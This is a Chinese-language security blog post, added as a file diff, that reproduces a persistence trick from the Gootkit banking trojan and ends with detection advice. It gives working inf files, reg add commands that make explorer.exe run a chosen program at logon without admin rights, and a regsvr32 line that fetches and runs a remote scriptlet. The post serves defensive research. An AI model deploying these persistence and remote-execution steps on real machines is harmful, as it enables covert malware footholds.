@@ -1,0 +1,206 @@
+<article class="post">
+  <h1>GookitBankingTrojan中的后门利用分析</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>Gootkit Banking Trojan在2014年被首次发现，最近Daniel Bunce（@ 0verfl0w_）介绍了一些对于Gootkit Banking Trojan的分析，文章地址如下：</p>
+
+<p>https://www.sentinelone.com/blog/gootkit-banking-trojan-persistence-other-capabilities/</p>
+
+<p>其中，Gootkit Banking Trojan使用的后门启动方法是独有的，所以本文仅在技术研究的角度复现Gootkit Banking Trojan使用的后门启动方法，分析利用思路，给出防御和检测的建议。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>原理介绍</li>
+  <li>inf文件的基础知识</li>
+  <li>复现后门启动方法</li>
+  <li>分析利用方法</li>
+  <li>检测和防御建议</li>
+</ul>
+
+<h2 id="0x02-原理介绍">0x02 原理介绍</h2>
+<hr>
+
+<p>explorer.exe在运行时会加载特定的组策略对象(GPO)，其中包括Internet Explorer Administration Kit(IEAK)的GPO</p>
+
+<p>如果通过添加注册表的方式为IKAK创建一个Pending GPO，指向一个inf文件，那么在explorer.exe启动时，就会加载这个Pending GPO，执行inf文件中的内容</p>
+
+<p>这个方法的优点是不需要管理员权限</p>
+
+<h2 id="0x03-inf文件的基础知识">0x03 inf文件的基础知识</h2>
+<hr>
+
+<p>inf全称Device INFormation File，是Microsoft为硬件设备制造商发布其驱动程序推出的一种文件格式</p>
+
+<p>对大小写不敏感</p>
+
+<p>文件格式：</p>
+
+<p>由多个节组成，节名用方括号括起来</p>
+
+<p>值得注意的节：</p>
+
+<h3 id="1version节">1.Version节</h3>
+
+<p>inf文件都包含这个节，用来描述支持的设备类型和适用的操作系统</p>
+
+<p><code class="language-plaintext highlighter-rouge">signature="$CHICAGO$</code>表示该inf文件适用于Windows98之后的所有操作系统</p>
+
+<p><code class="language-plaintext highlighter-rouge">signature="$Windows NT$"</code>表示该inf文件适用于Windows 2000/XP/2003操作系统</p>
+
+<h3 id="2defaultinstall节">2.DefaultInstall节</h3>
+
+<p>默认情况下首先执行该节内的内容，通常包括文件拷贝、删除，注册表键值的更新，子键删除等功能，还支持执行命令：</p>
+
+<ul>
+  <li>RunPreSetupCommands，本节中指定的命令在安装服务配置文件之前运行</li>
+  <li>RunPostSetupCommands，本节中指定的命令在安装程序完成服务配置文件后运行</li>
+  <li>RunPreUnInstCommands，本节中指定的命令在卸载程序开始之前运行</li>
+  <li>RunPostUnInstCommands，本节中指定的命令在卸载程序运行后运行</li>
+</ul>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</p>
+
+<p>例如一个分别执行cmd命令和弹出计算器的test.inf文件示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Version]
+Signature="$CHICAGO$"
+AdvancedINF=2.5,"advpack.dll"
+[DefaultInstall]
+RunPreSetupCommands=Command1
+RunPostSetupCommands=Command2
+[Command1]
+C:\WINDOWS\SYSTEM32\calc.exe
+[Command2]
+C:\WINDOWS\SYSTEM32\cmd.exe
+</code></pre></div></div>
+
+<p>命令行下的启动方式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe advpack.dll,LaunchINFSection test.inf,DefaultInstall
+</code></pre></div></div>
+
+<p>执行后先弹出计算器，关闭计算器后，再弹出cmd.exe</p>
+
+<h2 id="0x04-后门启动方法复现">0x04 后门启动方法复现</h2>
+<hr>
+
+<p>1.使用测试程序putty.exe，保存位置： <code class="language-plaintext highlighter-rouge">c:\test\putty.exe</code></p>
+
+<p>2.新建putty.inf，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Version]
+Signature="$CHICAGO$"
+AdvancedINF=2.5,"You need a new version of advpack.dll"
+
+[DefaultInstall]
+RunPreSetupCommands=Command1:2
+[Command1]
+c:\test\putty.exe
+</code></pre></div></div>
+
+<p>3.新建注册表项</p>
+
+<ul>
+  <li>HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Count, REG_DWORD，1</li>
+  <li>HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Path1，REG_SZ，”c:\test\test.inf”</li>
+  <li>HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Section1，REG_SZ，”DefaultInstall”</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>原文中Section1的值为<code class="language-plaintext highlighter-rouge">[DefaultInstall]</code>，经测试，此处存在bug，正确的值应该为<code class="language-plaintext highlighter-rouge">DefaultInstall</code></p>
+
+<p>注册表设置如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-10/2-1.png" alt="Alt text"></p>
+
+<p>4.重启系统</p>
+
+<p>系统启动后执行putty.exe，复现成功</p>
+
+<p><strong>注：</strong></p>
+
+<p>系统重启后该注册表会被清除，为了保证下次重启系统时再次触发后门，需要再次修改注册表，添加对应的键值，可供参考的cmd命令如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Count /t REG_DWORD /d 1
+reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Path1 /t REG_SZ /d "c:\test\test.inf"
+reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Section1 /t REG_SZ /d "DefaultInstall"
+</code></pre></div></div>
+
+<h2 id="0x05-方法优化">0x05 方法优化</h2>
+<hr>
+
+<h3 id="1inf文件不需要同要启动的exe文件同名">1.inf文件不需要同要启动的exe文件同名</h3>
+
+<p>inf文件名称可以任意，例如test.inf</p>
+
+<p><strong>注：</strong></p>
+
+<p>原文描述需要inf文件同exe文件同名</p>
+
+<h3 id="2inf文件内容格式不固定">2.inf文件内容格式不固定</h3>
+
+<p><code class="language-plaintext highlighter-rouge">AdvancedINF=2.5,"You need a new version of advpack.dll"</code>可修改为<code class="language-plaintext highlighter-rouge">AdvancedINF=2.5,"11111111"</code></p>
+
+<h3 id="3inf文件的payload不唯一">3.inf文件的payload不唯一</h3>
+
+<p>还可以实现文件拷贝、删除，注册表键值的更新，子键删除等功能</p>
+
+<p>如果是执行命令，可以同sct结合实现无文件落地，例如实现远程下载执行的文件内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Version]
+Signature="$CHICAGO$"
+AdvancedINF=2.5,"advpack.dll"
+[DefaultInstall]
+RunPreSetupCommands=Command1
+[Command1]
+regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
+</code></pre></div></div>
+
+<h2 id="0x06-利用分析">0x06 利用分析</h2>
+<hr>
+
+<p>优点如下：</p>
+
+<p>1.不需要管理员权限，只需要普通用户权限即可</p>
+
+<p>2.payload扩展性高，同其他方法结合(如sct)可实现远程下载执行，不需要向硬盘写入文件</p>
+
+<h2 id="0x07-检测和防御建议">0x07 检测和防御建议</h2>
+<hr>
+
+<p>监控注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs</code></p>
+
+<p>默认配置下，系统不存在注册表项：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>修改注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs</code>不会触发这个后门</p>
+
+<h2 id="0x08-小结">0x08 小结</h2>
+<hr>
+
+<p>本文复现了Gookit Banking Trojan中的后门启动方法，分析利用思路，给出防御和检测的建议。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on September 10, 2019
+  </div>
+
+  
+</article>
